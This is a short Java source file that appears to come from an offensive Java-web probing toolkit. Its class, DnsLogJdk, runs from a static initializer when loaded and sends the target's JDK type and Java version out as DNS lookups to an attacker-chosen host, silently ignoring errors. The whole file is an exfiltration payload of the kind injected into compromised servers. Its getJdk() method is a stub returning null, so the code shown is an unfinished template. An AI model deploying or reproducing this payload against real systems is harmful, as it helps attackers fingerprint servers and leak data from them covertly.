package com.reajason.javaweb.probe.payload.dns;

import java.net.InetAddress;

/**
 * @author ReaJason
 * @since 2025/7/28
 */
public class DnsLogJdk {
    public static String host;

    static {
        new DnsLogJdk();
    }

    public DnsLogJdk() {
        String[] jdkInfos = getJdk().split("\\|");
        String[] result = new String[]{
                "jdkType." + jdkInfos[0],
                "javaVersion." + jdkInfos[1]
        };
        for (String info : result) {
            try {
                InetAddress.getAllByName(info + "." + host);
            } catch (Throwable ignored) {
            }
        }
    }

    private String getJdk() {
        return null;
    }
}
